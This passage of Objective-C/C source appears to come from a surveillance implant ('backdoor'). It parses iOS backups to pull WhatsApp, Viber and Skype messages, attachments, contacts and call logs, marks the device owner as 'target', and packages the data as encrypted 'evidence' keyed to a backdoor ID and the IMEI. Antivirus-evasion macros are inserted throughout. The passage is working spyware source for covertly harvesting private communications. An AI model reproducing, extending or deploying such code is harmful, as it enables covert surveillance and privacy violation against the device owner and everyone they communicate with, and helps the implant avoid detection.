            // clean
            [writer release];
            [jsonAddHeader release];
            [encryptedData release];
        }
    }
    
    [logData release];
    [contentLog release];
    [logHeader release];
    [pool release];
}

// platform specific code
void logChat(chatRecord *head)
{
    if (head == NULL)
    {
        return;
    }

     
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    NSMutableData *logData = [[NSMutableData alloc] initWithCapacity:0];
    
    chatRecord *current = head;

    while (current!=NULL)
    {
 
#ifdef DEBUG_BKUPS
        infoLog(@"from: %s",current->from);
        infoLog(@"to: %s",current->to);
        infoLog(@"text: %s",current->text);
        infoLog(@"flags: %d",current->flags);
        infoLog(@"epoch: %d",current->epochTime);
#endif
        
        NSString *fromString;
        NSString *toString;
        NSString *textString;
        if (current->from != NULL)
        {
            fromString = [NSString stringWithUTF8String:current->from];
        }
        else
        {
            fromString = @" ";
        }
        if (current->to != NULL)
        {
            toString = [NSString stringWithUTF8String:current->to];
        }
        else
        {
            toString = @" ";
        }
        if (current->text != NULL)
        {
            textString = [NSString stringWithUTF8String:current->text];
        }
        else
        {
            textString = @" ";
        }
        // append timestamp
        time_t msgTime = current->epochTime;
        struct tm *tmTemp;
        tmTemp = gmtime(&msgTime);
        tmTemp->tm_year += 1900;
        tmTemp->tm_mon  ++;
    
        //
        // Our struct is 0x8 bytes bigger than the one declared on win32
        // this is just a quick fix
        // 0x14 bytes for 64bit processes
        //
        if (sizeof(long) == 4) // 32bit
        {
            // AV evasion: only on release build
            AV_GARBAGE_008
        
            [logData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x8];
        }
        else if (sizeof(long) == 8) // 64bit
        {
            // AV evasion: only on release build
            AV_GARBAGE_001
        
            [logData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x14];
        }
        // append program type
        [logData appendBytes:&(current->type) length:sizeof(current->type)];
        // append flags
        [logData appendBytes:&(current->flags) length:sizeof(current->flags)];
        // append topic/sender
        [logData appendData:[fromString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
        [logData appendBytes:&unicodeNullTerminator length:sizeof(short)];
        // append sender display
        [logData appendData:[fromString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
        [logData appendBytes:&unicodeNullTerminator length:sizeof(short)];
        // append to
        [logData appendData:[toString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
        [logData appendBytes:&unicodeNullTerminator length:sizeof(short)];
        // append to display
        [logData appendData:[toString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
        [logData appendBytes:&unicodeNullTerminator length:sizeof(short)];
        // append content
        [logData appendData:[textString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
        [logData appendBytes:&unicodeNullTerminator length:sizeof(short)];
        // append delimiter
        [logData appendBytes: &delimiter length: sizeof(delimiter)];
 
        current = current->next;
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_000

    if ([logData length] > 0)
    {
        __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
        
        NSMutableData *encryptedData = [logManager prepareDataToLog:logData evidenceHeader:nil forAgentID:AGENT_CHAT_NEW];
        
        if(encryptedData !=nil)
        {
            SBJsonWriter *writer = [[SBJsonWriter alloc] init];
            
            // additional header
            NSMutableData *jsonAddHeader = [[NSMutableData alloc] initWithCapacity:0];
            uint32_t version = 2015040801;
            [jsonAddHeader appendBytes:&version length:sizeof(uint32_t)];
            NSMutableDictionary *dictHeader = [NSMutableDictionary dictionary];
            [dictHeader setObject:@"ios" forKey:@"platform"];
            NSString *bIdString = [NSString stringWithUTF8String:gBackdoorID];
            [dictHeader setObject:bIdString forKey:@"ident"];
            NSString *imeiString = [NSString stringWithUTF8String:imei];
            [dictHeader setObject:imeiString forKey:@"instance"];
            [dictHeader setObject:@"evidence" forKey:@"type"];
            NSString *jsonHeaderString = [writer stringWithObject:dictHeader];
            [jsonAddHeader appendData:[jsonHeaderString dataUsingEncoding:NSUTF8StringEncoding]];
            
            // content is encrypted data
            
            // log
            BOOL success = [logManager createLog: LOGTYPE_PROXY_EV
                                     agentHeader: jsonAddHeader
                                       withLogID: 0];
            
            if (success)
            {
                [logManager writeDataToLog: encryptedData
                                  forAgent: LOGTYPE_PROXY_EV
                                 withLogID: 0];
                // AV evasion: only on release build
                AV_GARBAGE_001
                
                [logManager closeActiveLog: LOGTYPE_PROXY_EV
                                 withLogID: 0];
                
                // AV evasion: only on release build
                AV_GARBAGE_004
            }
            
            // clean
            [writer release];
            [jsonAddHeader release];
            [encryptedData release];
        }

    }
    [logData release];
    [pool release];
    
    return;

}

// platform specific code
void logAttach(attachRecord *att)
{
    if (att == NULL)
    {
        return;
    }
    if (att->filename == NULL)
    {
        return;
    }
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
 
    NSString *fnString = [NSString stringWithUTF8String:att->filename];
    unsigned long long fileSize = 0;
    fileSize = [[[NSFileManager defaultManager] attributesOfItemAtPath:fnString error:nil] fileSize];
    if ((fileSize == 0) || (fileSize > MAX_FILE_SIZE))
    {
        [pool release];
        return;
    }
    
    NSMutableData *additionalHeader = [[NSMutableData alloc] initWithCapacity:0];
    // append timestamp
    time_t msgTime = att->epochTime;
    struct tm *tmTemp;
    tmTemp = gmtime(&msgTime);
    tmTemp->tm_year += 1900;
    tmTemp->tm_mon  ++;
    //
    // Our struct is 0x8 bytes bigger than the one declared on win32
    // this is just a quick fix
    // 0x14 bytes for 64bit processes
    //
    if (sizeof(long) == 4) // 32bit
    {
        // AV evasion: only on release build
        AV_GARBAGE_008
        
        [additionalHeader appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x8];
    }
    else if (sizeof(long) == 8) // 64bit
    {
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        [additionalHeader appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x14];
    }
    // append program type
    [additionalHeader appendBytes:&(att->type) length:sizeof(att->type)];
    // append flags
    [additionalHeader appendBytes:&(att->flags) length:sizeof(att->flags)];
    // append topic/sender
    NSString *fromString = NULL;
    if(att->from != NULL)
        fromString = [NSString stringWithUTF8String:att->from];
    else
        fromString = @" ";
    [additionalHeader appendData:[fromString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
    [additionalHeader appendBytes:&unicodeNullTerminator length:sizeof(short)];
    // append sender display
    [additionalHeader appendData:[fromString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
    [additionalHeader appendBytes:&unicodeNullTerminator length:sizeof(short)];
    // append to
    NSString *toString = NULL;
    if(att->to != NULL)
        toString = [NSString stringWithUTF8String:att->to];
    else
        toString = @" ";
    [additionalHeader appendData:[toString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
    [additionalHeader appendBytes:&unicodeNullTerminator length:sizeof(short)];
    // append to display
    [additionalHeader appendData:[toString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
    [additionalHeader appendBytes:&unicodeNullTerminator length:sizeof(short)];
    // append mime type
    NSString *mimeString = NULL;
    if(att->mimeType != NULL)
        mimeString = [NSString stringWithUTF8String:att->mimeType];
    else
        mimeString = @" ";
    [additionalHeader appendData:[mimeString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
    [additionalHeader appendBytes:&unicodeNullTerminator length:sizeof(short)];
    // append filename, can be absolute or relative path
    NSString *tnString = NULL;
    if(att->transferName != NULL)
        tnString = [NSString stringWithUTF8String:att->transferName];
    else
        tnString = @" ";
    [additionalHeader appendData:[tnString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
    [additionalHeader appendBytes:&unicodeNullTerminator length:sizeof(short)];
    
    NSMutableData *logData = [NSMutableData dataWithContentsOfFile:fnString];
    
    if (logData != nil)
    {
        __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
        
        NSMutableData *encryptedData = [logManager prepareDataToLog:logData evidenceHeader:additionalHeader forAgentID:LOGTYPE_MMCHAT];
        
        if(encryptedData !=nil)
        {
            SBJsonWriter *writer = [[SBJsonWriter alloc] init];
            
            // additional header
            NSMutableData *jsonAddHeader = [[NSMutableData alloc] initWithCapacity:0];
            uint32_t version = 2015040801;
            [jsonAddHeader appendBytes:&version length:sizeof(uint32_t)];
            NSMutableDictionary *dictHeader = [NSMutableDictionary dictionary];
            [dictHeader setObject:@"ios" forKey:@"platform"];
            NSString *bIdString = [NSString stringWithUTF8String:gBackdoorID];
            [dictHeader setObject:bIdString forKey:@"ident"];
            NSString *imeiString = [NSString stringWithUTF8String:imei];
            [dictHeader setObject:imeiString forKey:@"instance"];
            [dictHeader setObject:@"evidence" forKey:@"type"];
            NSString *jsonHeaderString = [writer stringWithObject:dictHeader];
            [jsonAddHeader appendData:[jsonHeaderString dataUsingEncoding:NSUTF8StringEncoding]];
            
            // content is encrypted data
            
            // log
            BOOL success = [logManager createLog: LOGTYPE_PROXY_EV
                                     agentHeader: jsonAddHeader
                                       withLogID: 0];
            
            if (success)
            {
                [logManager writeDataToLog: encryptedData
                                  forAgent: LOGTYPE_PROXY_EV
                                 withLogID: 0];
                // AV evasion: only on release build
                AV_GARBAGE_001
                
                [logManager closeActiveLog: LOGTYPE_PROXY_EV
                                 withLogID: 0];
                
                // AV evasion: only on release build
                AV_GARBAGE_004
            }
            
            // clean
            [writer release];
            [jsonAddHeader release];
            [encryptedData release];
        }
 
    }
    
    [additionalHeader release];
    [pool release];
}


int parseWADb(char *dbName, long epochMarkup)
{
    sqlite3 *db = NULL;
    sqlite3_stmt *stmt = NULL;
    
    chatRecord *msgsHead = NULL;
    
    char query[512];
    long date = epochMarkup;
    char _query[] = "select zmessagedate, zisfromme, ztext, zfromjid, (select zmemberjid from zwagroupmember where zgroupmember = zwagroupmember.z_pk) , ztojid, (select zsessiontype from zwachatsession where zwamessage.zchatsession = zwachatsession.z_pk), (select GROUP_CONCAT(zmemberjid) from zwagroupmember where zwamessage.zchatsession = zwagroupmember.zchatsession) from zwamessage where zmessagetype = 0 and zmessagedate >";
    
    // open db
    if (sqlite3_open(dbName, &db))
    {
        sqlite3_close(db);
        return -1;
    }
    
    // construct query
    if ((date -= TimeIntervalSince1970) <0 )  // date in db is in mac absolute time
    {
        date = 1;
    }
    sprintf(query, "%s %ld", _query, date);
    
    if(sqlite3_prepare_v2(db, query, strlen(query) + 1, &stmt, NULL) != SQLITE_OK)
    {
        sqlite3_finalize(stmt);
        sqlite3_close(db);
        return -1;
    }
    
    while(sqlite3_step(stmt) == SQLITE_ROW)
    {
        chatRecord *msg = calloc(1,sizeof(chatRecord));
        if (msg == NULL)
        {
            continue;
        }
        // text
        char *_text = (char *)sqlite3_column_text(stmt,2);
        
        if (_text == NULL)
        {
            freeChatRecord(msg);
            continue;
        }
        // text
        if ((msg->text = calloc(strlen(_text) +1, sizeof(char))) != NULL)
        {
            strcpy(msg->text,_text);
        }
        // chat type
        msg->type = WA_CHAT;
        // chat date
        msg->epochTime = sqlite3_column_double(stmt,0);
        msg->epochTime += TimeIntervalSince1970;
        // in,out flags
        int fromMe = sqlite3_column_int(stmt,1);
        msg->flags = ((fromMe == 1)? 0x00000000 : 0x00000001);
        // from, to
        // if zsessiontype==1, it's a group chat
        int isAGroup = sqlite3_column_int(stmt, 6);
        
        if (fromMe == 1)
        {
            // msg is from me
            if((msg->from = calloc(strlen("target")+1,sizeof(char)))!=NULL)
            {
                strcpy(msg->from, "target");
            }
            
            if(isAGroup)
            {
                char *_to = (char *)sqlite3_column_text(stmt,7);
                if (_to != NULL)
                {
                    if ((msg->to = calloc(strlen(_to) +1, sizeof(char))) != NULL)
                    {
                        strcpy(msg->to,_to);
                    }
                }
            }
            else
            {
                char *_to = (char *)sqlite3_column_text(stmt,5);
                if (_to != NULL)
                {
                    if ((msg->to = calloc(strlen(_to) +1, sizeof(char))) != NULL)
                    {
                        strcpy(msg->to,_to);
                    }
                }
            }
        }
        else
        {
            // msg is not from me
            if(isAGroup)
            {
                char *_from = (char *)sqlite3_column_text(stmt,4);
                if (_from != NULL)
                {
                    if ((msg->from = calloc(strlen(_from) +1, sizeof(char))) != NULL)
                    {
                        strcpy(msg->from,_from);
                    }
                }
                
                if((msg->to = calloc(strlen("target")+1,sizeof(char)))!=NULL)
                {
                    strcpy(msg->to, "target");
                }
                char *_to = (char *)sqlite3_column_text(stmt,7);
                if (_to != NULL)
                {
                    char *new = realloc(msg->to,sizeof(char)*(strlen(msg->to)+strlen(_to))+1);
                    if (new != NULL)
                    {
                        msg->to = new;
                        strcat(msg->to, ",");
                        strcat(msg->to,_to);
                    }
                }
            }
            else
            {
                // sender is not a group
                char *_from = (char *)sqlite3_column_text(stmt,3);
                if(_from != NULL)
                {
                    if ((msg->from = calloc(strlen(_from)+1,sizeof(char)))!=NULL)
                    {
                        strcpy(msg->from,_from);
                    }
                }
                if((msg->to = calloc(strlen("target")+1,sizeof(char)))!=NULL)
                {
                    strcpy(msg->to, "target");
                }
                
            }
        }
        // enqueue
        msg->next = msgsHead;
        msgsHead = msg;
    }
    
    
    // free sqlite resources
    sqlite3_finalize(stmt);
    
    // close db
    sqlite3_close(db);
    
    // log
    logChat(msgsHead);
    
    // free allocated mem
    deleteChatRecordList(msgsHead);
    
    return 1;
}


int collectWhatsApp(mbdbRecord *head, long epochMarkup)
{
    if (head == NULL)
    {
        return -1;
    }
    
    mbdbRecord *current = head;
    while (current!=NULL)
    {
        if (strend(current->filename,"ChatStorage.sqlite"))
        {
#ifdef DEBUG_BKUPS
            infoLog(@"found wa db\n");
            infoLog(@"filename: %s\n",current->sha1);
#endif
            parseWADb(current->sha1, epochMarkup);
            return 1;
        }
        current = current->next;
    }
    return -1;
}


int parseViberDb(char *dbName, long epochMarkup)
{
    if (dbName == NULL)
    {
        return -1;
    }
    
    chatRecord *msgsHead = NULL;
    
    sqlite3 *db = NULL;
    sqlite3_stmt *stmt = NULL;
    char query[256];
    long date = epochMarkup;
    char _query[] = "select ztext, zstate, zdate, zconversation, zphonenum from zvibermessage left outer join zphonenumberindex  on zphonenumindex=zphonenumberindex.z_pk where zdate >";
    
    // open db
    if (sqlite3_open(dbName, &db))
    {
        sqlite3_close(db);
        return -1;
    }
    
    // construct query
    if ((date -= TimeIntervalSince1970) < 0 )  // date in db is in mac absolute time
    {
        date = 1;
    }
    sprintf(query, "%s %ld", _query, date);
    
    if(sqlite3_prepare_v2(db, query, -1, &stmt, NULL) != SQLITE_OK)
    {
        sqlite3_finalize(stmt);
        sqlite3_close(db);
        return -1;
    }
    
    while(sqlite3_step(stmt) == SQLITE_ROW)
    {
        chatRecord *msg = calloc(1,sizeof(chatRecord));
        if (msg == NULL)
        {
            continue;
        }
        // text
        char *text = (char *)sqlite3_column_text(stmt,0);
        if (text == NULL)
        {
            freeChatRecord(msg);
            continue;
        }
        if ((msg->text = calloc(strlen(text)+1,sizeof(char))) != NULL)
        {
            strcpy(msg->text,text);
        }
        // chat type
        msg->type = VIBER_CHAT;
        // chat date
        msg->epochTime = sqlite3_column_double(stmt,2);
        msg->epochTime += TimeIntervalSince1970;
        // sender when msg incoming
        char *_from = (char *)sqlite3_column_text(stmt,4);
        // peer
        sqlite3_stmt *stmt2 = NULL;
        char inner_query[256];
        int conversation  = sqlite3_column_int(stmt,3);
        
        char _inner_query_3[] = "select zphonenumberindex.zphonenum from zphonenumberindex,z_3phonenumindexes where z_3phonenumindexes.z_5phonenumindexes =  zphonenumberindex.z_pk and z_3phonenumindexes.z_3conversations =";
        char _inner_query_4[] = "select zphonenumberindex.zphonenum from zphonenumberindex,z_4phonenumindexes where z_4phonenumindexes.z_6phonenumindexes =  zphonenumberindex.z_pk and z_4phonenumindexes.z_4conversations =";
        char *peer = NULL;
        int ok = 0;
        sprintf(inner_query, "%s %d", _inner_query_4, conversation);
        if(sqlite3_prepare_v2(db, inner_query, -1, &stmt2, NULL) == SQLITE_OK)
        {
            ok = 1;
        }
        else
        {
            sqlite3_finalize(stmt2);
            sprintf(inner_query, "%s %d", _inner_query_3, conversation);
            if(sqlite3_prepare_v2(db, inner_query, -1, &stmt2, NULL) == SQLITE_OK)
            {
                ok = 1;
            }
        }
        if (ok)
        {
            while (sqlite3_step(stmt2) == SQLITE_ROW)
            {
                char *phone = (char *)sqlite3_column_text(stmt2,0);
                if (phone == NULL)
                    continue;
                int add = 1;
                if(_from != NULL)
                {
                    if (strcmp(_from,phone) == 0)
                    {
                        add = 0;
                    }
                }
                if (add)
                {
                    if (peer == NULL)
                    {
                        // first run
                        if ((peer = calloc(strlen(phone)+1,sizeof(char)))!=NULL)
                        {
                            strcpy(peer,phone);
                        }
                    }
                    else
                    {
                        peer = realloc(peer,sizeof(char)*(strlen(peer)+strlen(phone)+strlen(","))+1);
                        if (peer != NULL)
                        {
                            strcat(peer, ",");
                            strcat(peer,phone);
                        }
                    }
                }
            }
        }
        sqlite3_finalize(stmt2);
        
        // in, out flags;  to,from
        char *_state = (char *)sqlite3_column_text(stmt,1);
        if ((strncmp(_state,"delivered",strlen("delivered")) ==0) || (strncmp(_state,"send",strlen("send")) ==0) || (strncmp(_state,"pending",strlen("pending")) ==0))
        {
            // out
            msg->flags = 0x00000000;
            if(peer != NULL)
            {
                if((msg->to = calloc(strlen(peer)+1,sizeof(char))) != NULL)
                {
                    strcpy(msg->to,peer);
                }
            }
            if((msg->from = malloc(sizeof(char)*strlen("target")+1)) != NULL)  // TODO: find real phone number
                strcpy(msg->from,"target");
        }
        else
        {
            // in
            msg->flags = 0x00000001;
            if(_from!=NULL)
            {
                if((msg->from = calloc(strlen(_from)+1,sizeof(char))) != NULL)
                    strcpy(msg->from,_from);
            }
            if((msg->to = calloc(strlen("target")+1,sizeof(char))) != NULL)  // TODO: find real phone number
                strcpy(msg->to,"target");
            // add peer if not null
            if (peer != NULL)
            {
                if (msg->to == NULL)
                {
                    // first run
                    if ((msg->to = calloc(strlen(peer)+1,sizeof(char)))!=NULL)
                    {
                        strcpy(msg->to,peer);
                    }
                }
                else
                {
                    char *new = realloc(msg->to,sizeof(char)*(strlen(msg->to)+strlen(peer)+strlen(","))+1);
                    if (new != NULL)
                    {
                        msg->to = new;
                        strcat(msg->to, ",");
                        strcat(msg->to,peer);
                    }
                }
            }
        }
        free(peer);
        // enqueue
        msg->next = msgsHead;
        msgsHead = msg;
    }
    
    // free sqlite resources
    sqlite3_finalize(stmt);
    
    // close db
    sqlite3_close(db);
    
    // log
    logChat(msgsHead);
    
    // free alocated meme
    deleteChatRecordList(msgsHead);
    
    return 1;
}


int collectViber(mbdbRecord *head, long epochMarkup)
{
    if (head == NULL)
    {
        return -1;
    }
    
    mbdbRecord *current = head;
    while (current!=NULL)
    {
        if (strend(current->filename,"Contacts.data"))
        {
#ifdef DEBUG_BKUPS
            infoLog(@"found viber db\n");
            infoLog(@"filename: %s\n",current->sha1);
#endif
            parseViberDb(current->sha1, epochMarkup);
            return 1;
        }
        current = current->next;
    }
    return -1;
}



// replace old with new in origin
// free resulting string
/*
char* replaceChr(char *origin, char *old, char *new)
{
    char *result = NULL;
    
    if ((origin == NULL) || (old == NULL) || (new == NULL))
        return result;
    
    result = calloc(strlen(origin)+1,sizeof(char));
    if (result != NULL)
    {
        strcpy(result,origin);
        char *tmp = NULL;
        char *ptr = result;
        while ((tmp=strstr(ptr,old)) != NULL)
        {
            memcpy(tmp,new,sizeof(char));
            ptr = tmp + sizeof(char);
        }
    }
    return result;
}*/


int parseSkypeDb(mbdbRecord *head,char *dbName, long epochMarkup)
{
    if (dbName == NULL)
    {
        return -1;
    }
    
    chatRecord *msgsHead = NULL;
    
    sqlite3 *db = NULL;
    sqlite3_stmt *stmt = NULL;
    char query[1024];
    long date = epochMarkup;
    char _query[] = "select Messages.body_xml, Messages.author, Messages.from_dispname, (select GROUP_CONCAT(Participants.identity) from Participants where Messages.convo_id = Participants.convo_id ), Messages.chatmsg_status, Messages.timestamp, Transfers.filename, Transfers.starttime from Messages outer left join Transfers on Messages.guid = Transfers.chatmsg_guid where Messages.timestamp >";
    
    // open db
    if (sqlite3_open(dbName, &db))
    {
        sqlite3_close(db);
        return -1;
    }
    
    // construct query
    // timestamp in db is in epoch
    sprintf(query, "%s %ld", _query, date);
    
    if(sqlite3_prepare_v2(db, query, -1, &stmt, NULL) != SQLITE_OK)
    {
        sqlite3_close(db);
        return -1;
    }
    
    while(sqlite3_step(stmt) == SQLITE_ROW)
    {
        chatRecord *msg = calloc(1,sizeof(chatRecord));
        if(msg == NULL)
            continue;
        // text
        char *text = (char *)sqlite3_column_text(stmt,0);
        if (text == NULL)
        {
            freeChatRecord(msg);
            continue;
        }
        if((msg->text = calloc(strlen(text)+1,sizeof(char)))!= NULL)
        {
            strcpy(msg->text,text);
        }
        // chat type
        msg->type = SKYPE_CHAT;
        // chat date - epoch time in skype db
        msg->epochTime = sqlite3_column_double(stmt,5);
        // in, out flags
        int direction = sqlite3_column_int(stmt,4);
        switch (direction) {
            case 1:
            case 2:
            {
                // outgoing
                msg->flags = 0x00000000;
            }
                break;
            case 3:
            case 4:
            {
                // incoming
                msg->flags = 0x00000001;
            }
                break;
            default:
                break;
        }
        // from
        char *from = (char *)sqlite3_column_text(stmt,1);
        if (from != NULL)
        {
            if ((msg->from = calloc(strlen(from)+1,sizeof(char)))!=NULL)
            {
                strcpy(msg->from,from);
            }
        }
        // to
        char *peer = (char *)sqlite3_column_text(stmt,3);
        if (peer != NULL)
        {
            if ((msg->to = calloc(strlen(peer)+1,sizeof(char)))!=NULL)
            {
                strcpy(msg->to,peer);
            }
        }
        
        // enqueue
        msg->next = msgsHead;
        msgsHead = msg;
        
        // log attach
        char *attachFilename = (char *)sqlite3_column_text(stmt,6);
        if (attachFilename != NULL)
        {
            attachRecord att;
            memset(&att,0,sizeof(attachRecord));
            
            mbdbRecord *current = head;
            while (current!=NULL)
            {
                // usually attach filename in device db starts with ~/,
                // that ~/, in backup db, is stripped out
                // this is the reason we check current->filename against attachFilename
                if (strend(current->filename,attachFilename))
                {
                    printf("found attachment\n");  // TODO: delete this!
                    printf("filename: %s\n",current->sha1);   // TODO: delete this!
                    att.to = msg->to;
                    att.from = msg->from;
                    att.filename = current->sha1;
                    //att.mimeType = (char *)sqlite3_column_text(stmt,6);
                    att.transferName = attachFilename;
                    att.flags = msg->flags;
                    att.type = SKYPE_CHAT;
                    att.epochTime = sqlite3_column_double(stmt,7);
                    
                    break;
                }
                current = current->next;
            }
            // log attach, we don't want empty logs
            if(att.filename != NULL)
            {
                logAttach(&att);
            }
        }
    }
    
    // free sqlite resources
    sqlite3_finalize(stmt);

    // log contacts
    // personal account
    memset(query, 0, 1024);
    sqlite3_stmt *stmt2 = NULL;
    char _query2[] = "select skypename,fullname,displayname,emails,phone_mobile from Accounts where profile_timestamp >";
    sprintf(query, "%s %ld", _query2, date);
    if(sqlite3_prepare_v2(db, query, -1, &stmt2, NULL) == SQLITE_OK)
    {
        while(sqlite3_step(stmt2) == SQLITE_ROW)
        {
            contactRecord rec;
            memset(&rec,0,sizeof(contactRecord));
            
            // first
            rec.firstName = (char *)sqlite3_column_text(stmt2,2);
            // last
            rec.lastName = (char *)sqlite3_column_text(stmt2,1);
            // social handle
            rec.socialHandle = (char *)sqlite3_column_text(stmt2,0);
            // mobile
            rec.mobile = (char *)sqlite3_column_text(stmt2,4);
            // email
            rec.email = (char *)sqlite3_column_text(stmt2,3);
            // program
            rec.program = 0x02;  // skype contact
            // local
            rec.local = 1; //my contact
            // log
            logContacts(&rec);
        }
    }
    sqlite3_finalize(stmt2);
    // other accounts
    memset(query,0,1024);
    sqlite3_stmt *stmt3 = NULL;
    char _query3[] = "select skypename,fullname,displayname,emails,phone_mobile from Contacts where profile_timestamp >";
    sprintf(query, "%s %ld", _query3, date);
    if(sqlite3_prepare_v2(db, query, -1, &stmt3, NULL) == SQLITE_OK)
    {
        while(sqlite3_step(stmt3) == SQLITE_ROW)
        {
            contactRecord rec;
            memset(&rec,0,sizeof(contactRecord));
            
            // first
            rec.firstName = (char *)sqlite3_column_text(stmt3,2);
            // last
            rec.lastName = (char *)sqlite3_column_text(stmt3,1);
            // social handle
            rec.socialHandle = (char *)sqlite3_column_text(stmt3,0);
            // mobile
            rec.mobile = (char *)sqlite3_column_text(stmt3,4);
            // email
            //rec.email = (char *)sqlite3_column_text(stmt3,3);
            // program
            rec.program = 0x02;  // skype contact
            // local
            rec.local = 0; // not my contact
            // log
            logContacts(&rec);
        }
    }
    sqlite3_finalize(stmt3);
    
    // close db
    sqlite3_close(db);
    
    // log
    logChat(msgsHead);
    
    // free allocated mem
    deleteChatRecordList(msgsHead);
    
    return 1;
}

int collectSkype(mbdbRecord *head, long epochMarkup)
{
    if (head == NULL)
    {
        return -1;
    }
    
    mbdbRecord *current = head;
    while (current!=NULL)
    {
        if (strend(current->filename,"main.db"))
        {
#ifdef DEBUG_BKUPS
            infoLog(@"found skype db\n");
            infoLog(@"filename: %s\n",current->sha1);
#endif
            parseSkypeDb(head, current->sha1, epochMarkup);
            return 1;
        }
        current = current->next;
    }
    return -1;
}


// platform specific code
void logCall(callRecord *head)
{
    if (head == NULL)
    {
        return;
    }
    
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    NSMutableData *logData = [[NSMutableData alloc] initWithCapacity:0];
    
    callRecord *current = head;
    while (current!=NULL)
    {
        if(current->address == NULL)
            continue;
        // construct data
        // append timestamp
        uint32_t date = current->epochTime;
        [logData appendBytes:&date length:sizeof(uint32_t)];
        // append program type
        uint32_t program = current->program;
        [logData appendBytes:&program length:sizeof(uint32_t)];
        // append flags
        uint32_t flags = current->flags;
        [logData appendBytes:&flags length:sizeof(uint32_t)];
        // append from,to
        NSString *fromString = NULL;
        NSString *toString = NULL;
        if (current->flags == 1)
        {
            // incoming
            if (current->address != NULL)
            {
                fromString = [NSString stringWithUTF8String:current->address];
            }
            else
            {
                fromString = @" ";
            }
            toString = @"target"; // me, local
        }
        else
        {
            // outgoing
            fromString = @"target"; // me, local
            if (current->address != NULL)
            {
                toString = [NSString stringWithUTF8String:current->address];
            }
            else
            {
                toString = @" ";
            }
        }
        [logData appendData:[fromString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
        [logData appendBytes:&unicodeNullTerminator length:sizeof(short)];
        [logData appendData:[fromString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
        [logData appendBytes:&unicodeNullTerminator length:sizeof(short)];
        
        [logData appendData:[toString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
        [logData appendBytes:&unicodeNullTerminator length:sizeof(short)];
        [logData appendData:[toString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
        [logData appendBytes:&unicodeNullTerminator length:sizeof(short)];
        
        // append duration
        uint32_t duration = current->duration;
        [logData appendBytes:&duration length:sizeof(uint32_t)];
        
        // append delimiter
        [logData appendBytes: &delimiter length: sizeof(delimiter)];
        
        current = current->next;
    }

    
    // log
    if ([logData length] >0)
    {
        __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
        
        NSMutableData *encryptedData = [logManager prepareDataToLog:logData evidenceHeader:nil forAgentID:LOGTYPE_CALL_LIST];
        
        if(encryptedData !=nil)
        {
            SBJsonWriter *writer = [[SBJsonWriter alloc] init];
            
            // additional header
            NSMutableData *additionalHeader = [[NSMutableData alloc] initWithCapacity:0];
            uint32_t version = 2015040801;
            [additionalHeader appendBytes:&version length:sizeof(uint32_t)];
            NSMutableDictionary *dictHeader = [NSMutableDictionary dictionary];
            [dictHeader setObject:@"ios" forKey:@"platform"];
            NSString *bIdString = [NSString stringWithUTF8String:gBackdoorID];
            [dictHeader setObject:bIdString forKey:@"ident"];
            NSString *imeiString = [NSString stringWithUTF8String:imei];
            [dictHeader setObject:imeiString forKey:@"instance"];
            [dictHeader setObject:@"evidence" forKey:@"type"];
            NSString *jsonHeaderString = [writer stringWithObject:dictHeader];
            [additionalHeader appendData:[jsonHeaderString dataUsingEncoding:NSUTF8StringEncoding]];
            
            // content is encrypted data
            
            // log
            BOOL success = [logManager createLog: LOGTYPE_PROXY_EV
                                     agentHeader: additionalHeader
                                       withLogID: 0];
            
            if (success)
            {
                [logManager writeDataToLog: encryptedData
                                  forAgent: LOGTYPE_PROXY_EV
                                 withLogID: 0];
                // AV evasion: only on release build
                AV_GARBAGE_001
                
                [logManager closeActiveLog: LOGTYPE_PROXY_EV
                                 withLogID: 0];
                
                // AV evasion: only on release build
                AV_GARBAGE_004
            }
            
            // clean
            [writer release];
            [additionalHeader release];
            [encryptedData release];
        }
    }
    
    [logData release];
    [pool release];
}

int parseCallDb(char *dbName, long epochMarkup)
{
    if (dbName == NULL)
    {
        return -1;
    }
    
    callRecord *recordsHead = NULL;
    
    sqlite3 *db = NULL;
    sqlite3_stmt *stmt = NULL;
    char query[256];
    long date = epochMarkup;
    char _query[] = "select address, date, duration, flags from call where date >";
    
    // open db
    if (sqlite3_open(dbName, &db))
    {
        sqlite3_close(db);
        return -1;
    }
    
    // construct query
    // timestamp in db is in epoch
    sprintf(query, "%s %ld", _query, date);
    
    if(sqlite3_prepare_v2(db, query, -1, &stmt, NULL) != SQLITE_OK)
    {
        sqlite3_close(db);
        return -1;
    }
    
    while(sqlite3_step(stmt) == SQLITE_ROW)
    {
        callRecord *rec = calloc(1,sizeof(callRecord));
        if (rec == NULL)
        {
            continue;
        }
        
        // address
        char *address = (char *)sqlite3_column_text(stmt,0);
        if(address != NULL)
        {
#ifdef DEBUG_BKUPS
            infoLog(@"ADDRESS: %s",address);
#endif
            if ((rec->address = calloc(strlen(address)+1,sizeof(char)))!=NULL)
            {
                strcpy(rec->address,address);
            }
        }
        // call date - epoch time
        rec->epochTime = sqlite3_column_double(stmt,1);
        // call duration - in seconds
        rec->duration = sqlite3_column_int(stmt,2);
        // call direction
        // all even values are incoming
        int dir = sqlite3_column_int(stmt,3);
